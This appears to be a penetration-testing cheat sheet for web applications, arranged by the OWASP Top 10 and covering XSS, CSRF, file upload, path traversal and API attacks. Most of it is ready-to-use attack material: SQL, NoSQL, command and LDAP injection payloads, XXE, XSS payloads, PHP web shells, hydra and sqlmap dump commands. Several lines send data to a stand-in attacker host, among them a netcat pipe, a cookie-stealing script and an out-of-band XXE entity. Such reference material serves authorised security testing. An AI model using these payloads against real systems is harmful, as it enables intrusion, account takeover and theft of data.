# Web Application Security Testing

## Overview

Web application penetration testing focuses on identifying vulnerabilities in web-based applications, APIs, and web services.

---

## OWASP Top 10 (2021)

### A01:2021 - Broken Access Control

```bash
# Test for IDOR (Insecure Direct Object References)
# Change user IDs, object IDs in URLs
GET /api/user/123 -> Try /api/user/124

# Forced browsing
GET /admin
GET /dashboard
GET /api/admin/users

# Parameter tampering
POST /update_profile
{"user_id": 123, "role": "admin"}
```

### A02:2021 - Cryptographic Failures

```bash
# Look for sensitive data in transit (non-HTTPS)
# Check for weak encryption algorithms
# Password storage analysis
# SSL/TLS misconfiguration

# Tools
testssl.sh target.com
sslscan target.com
sslyze --regular target.com
```

### A03:2021 - Injection

#### SQL Injection
```sql
# Basic SQLi
' OR '1'='1
admin'--
admin'#
' OR 1=1--

# Union-based SQLi
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT username, password FROM users--

# Boolean-based blind SQLi
' AND 1=1--    (True)
' AND 1=2--    (False)

# Time-based blind SQLi
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
'||pg_sleep(5)--

# SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
sqlmap -r request.txt --batch
sqlmap -u "http://target.com" --forms --crawl=2
```

#### NoSQL Injection
```javascript
# MongoDB injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin.*"}}

# Test in login forms
username[$ne]=admin&password[$ne]=pass
```

#### Command Injection
```bash
# Basic command injection
; ls -la
| whoami
& cat /etc/passwd
`id`
$(whoami)

# Blind command injection
; sleep 10
| ping -c 10 127.0.0.1
& nslookup attacker.com

# Examples
http://target.com/ping?ip=127.0.0.1; cat /etc/passwd
http://target.com/exec?cmd=ls | nc attacker.com 4444
```

#### LDAP Injection
```
# Bypass authentication
*
*)(&
*))%00
admin)(&)
```

#### XML Injection / XXE
```xml
# External Entity Injection
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

# Out-of-band XXE
<!ENTITY xxe SYSTEM "http://attacker.com/collect?data=">

# Billion laughs attack (DoS)
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
```

### A04:2021 - Insecure Design

- Missing security controls
- Business logic flaws
- Race conditions

### A05:2021 - Security Misconfiguration

```bash
# Directory listing
http://target.com/.git/
http://target.com/.env
http://target.com/backup/

# Default credentials
admin:admin
admin:password
root:root

# Exposed admin panels
/admin
/administrator
/phpmyadmin
/wp-admin

# Information disclosure
/phpinfo.php
/server-status
/.git/config
/web.config
```

### A06:2021 - Vulnerable and Outdated Components

```bash
# Identify technologies
whatweb target.com
wappalyzer (browser extension)
builtwith.com

# Check for known vulnerabilities
searchsploit application_name
cvedetails.com
```

### A07:2021 - Identification and Authentication Failures

```bash
# Brute force attacks
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
medusa -h target.com -U users.txt -P passwords.txt -M http

# Password reset flaws
# - Predictable reset tokens
# - Token reuse
# - No token expiration

# Session management flaws
# - Session fixation
# - Session hijacking
# - Predictable session IDs
```

### A08:2021 - Software and Data Integrity Failures

- Insecure deserialization
- Unsigned/unverified updates
- CI/CD pipeline attacks

### A09:2021 - Security Logging and Monitoring Failures

- Insufficient logging
- No alerting on suspicious activity
- Log injection

### A10:2021 - Server-Side Request Forgery (SSRF)

```bash
# Basic SSRF
http://target.com/fetch?url=http://localhost
http://target.com/fetch?url=http://127.0.0.1
http://target.com/fetch?url=http://169.254.169.254/  # AWS metadata

# Bypasses
http://target.com/fetch?url=http://0
http://target.com/fetch?url=http://[::1]
http://target.com/fetch?url=http://2130706433  # Decimal IP
http://target.com/fetch?url=http://0x7f.0x0.0x0.0x1  # Hex IP

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/  # GCP
http://169.254.169.254/metadata/instance  # Azure
```

---

## Cross-Site Scripting (XSS)

### Reflected XSS
```html
# Basic payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>

# Bypass filters
<ScRiPt>alert('XSS')</sCrIpT>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert('XSS')">
<svg><script>alert('XSS')</script></svg>
```

### Stored XSS
```html
# Persistent payloads in:
# - Comments
# - User profiles
# - Forum posts
# - Feedback forms

<script>
  new Image().src='http://attacker.com/steal?cookie='+document.cookie;
</script>
```

### DOM-based XSS
```javascript
# Vulnerable code
document.write(location.hash);

# Exploit
http://target.com/#<script>alert('XSS')</script>
```

### XSS Tools
```bash
# XSStrike
xsstrike -u "http://target.com/search?q=test"

# Dalfox
dalfox url http://target.com/search?q=test

# Manual testing with payload lists
# - PayloadsAllTheThings
# - PortSwigger XSS cheat sheet
```

---

## Cross-Site Request Forgery (CSRF)

```html
# Basic CSRF POC
<html>
  <body>
    <form action="http://target.com/change_password" method="POST">
      <input type="hidden" name="password" value="hacked123"/>
      <input type="submit" value="Click me"/>
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>

# GET-based CSRF
<img src="http://target.com/delete_account?confirm=yes">
```

---

## File Upload Vulnerabilities

```bash
# Bypass file type restrictions
# - Change extension: shell.php.jpg
# - Null byte: shell.php%00.jpg
# - Double extension: shell.php.png
# - MIME type manipulation
# - Magic bytes manipulation

# Web shells
<?php system($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>

# Upload techniques
# - SVG with XSS
# - .htaccess upload
# - Archive extraction (zip slip)
```

---

## Path Traversal / LFI / RFI

### Local File Inclusion (LFI)
```bash
# Basic LFI
http://target.com/page?file=../../../../etc/passwd
http://target.com/page?file=....//....//....//etc/passwd

# Null byte bypass (old PHP)
http://target.com/page?file=../../../../etc/passwd%00

# PHP wrappers
http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php
http://target.com/page?file=expect://whoami
http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log poisoning
# Inject PHP code in User-Agent, then include log file
http://target.com/page?file=../../../../var/log/apache2/access.log
```

### Remote File Inclusion (RFI)
```bash
http://target.com/page?file=http://attacker.com/shell.txt
```

---

## Authentication & Session Management

### Password Attacks
```bash
# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Credential stuffing
# Use leaked credentials from breaches

# Default credentials
admin:admin
admin:password
root:toor
```

### Session Attacks
```bash
# Session fixation
# Set session ID before login, use after authentication

# Session hijacking
# Steal session cookie via XSS or network sniffing

# Session prediction
# Analyze session token entropy
```

---

## API Security Testing

### REST API Testing
```bash
# Enumerate endpoints
ffuf -u http://target.com/api/FUZZ -w api-endpoints.txt

# Test HTTP methods
GET /api/users
POST /api/users
PUT /api/users/1
DELETE /api/users/1
PATCH /api/users/1

# Mass assignment
POST /api/users
{"username": "hacker", "role": "admin", "is_admin": true}

# API authentication bypass
# - Missing authentication
# - JWT manipulation
# - API key in URLs
```

### GraphQL Testing
```graphql
# Introspection query
{__schema{types{name,fields{name}}}}

# Query all data
{users{id,username,password,email}}

# Mutation testing
mutation {
  updateUser(id: "1", role: "admin")
}
```

### JWT Attacks
```bash
# JWT tool
jwt_tool <TOKEN>

# Common attacks
# - None algorithm
# - Algorithm confusion (RS256 to HS256)
# - Weak secret brute force
# - Kid injection
# - JKU header manipulation

# Decode JWT
echo <TOKEN> | cut -d'.' -f2 | base64 -d
```

---

## Business Logic Vulnerabilities

- Race conditions
- Price manipulation
- Quantity tampering
- Coupon reuse
- Referral abuse
- Order manipulation

---

## Web Application Scanning Tools

### Automated Scanners
```bash
# Nikto
nikto -h http://target.com

# OWASP ZAP
zaproxy

# Burp Suite
# Professional web vulnerability scanner

# Nuclei
nuclei -u http://target.com -t cves/

# WPScan (WordPress)
wpscan --url http://target.com --enumerate ap,at,u

# Joomscan (Joomla)
joomscan -u http://target.com

# Droopescan (Drupal, WordPress, Joomla)
droopescan scan wordpress -u http://target.com
```

### Manual Testing Tools
```bash
# Burp Suite - Intercepting proxy
# OWASP ZAP - Alternative to Burp
# Postman - API testing
# cURL - Command-line HTTP client
# wfuzz - Web fuzzer
# ffuf - Fast web fuzzer
```

---

## Web Shell Collection

See `03-web-application/shells/` for various web shells:
- PHP shells
- ASP/ASPX shells
- JSP shells
- Python shells

---

## Testing Methodology

1. **Reconnaissance**
   - Technology identification
   - Entry point discovery
   - Authentication mechanisms

2. **Authentication Testing**
   - Weak passwords
   - Password reset flaws
   - Multi-factor authentication bypass

3. **Authorization Testing**
   - Privilege escalation
   - IDOR vulnerabilities
   - Missing function level access control

4. **Input Validation**
   - SQL injection
   - XSS
   - Command injection
   - File upload

5. **Logic Testing**
   - Business logic flaws
   - Race conditions
   - Payment bypass

6. **Session Management**
   - Session fixation
   - Session timeout
   - Token security

7. **Error Handling**
   - Information disclosure
   - Stack traces
   - Error messages

---

## Further Reading

- OWASP Web Security Testing Guide
- PortSwigger Web Security Academy
- HackerOne Disclosed Reports
- Bugcrowd Vulnerability Rating Taxonomy
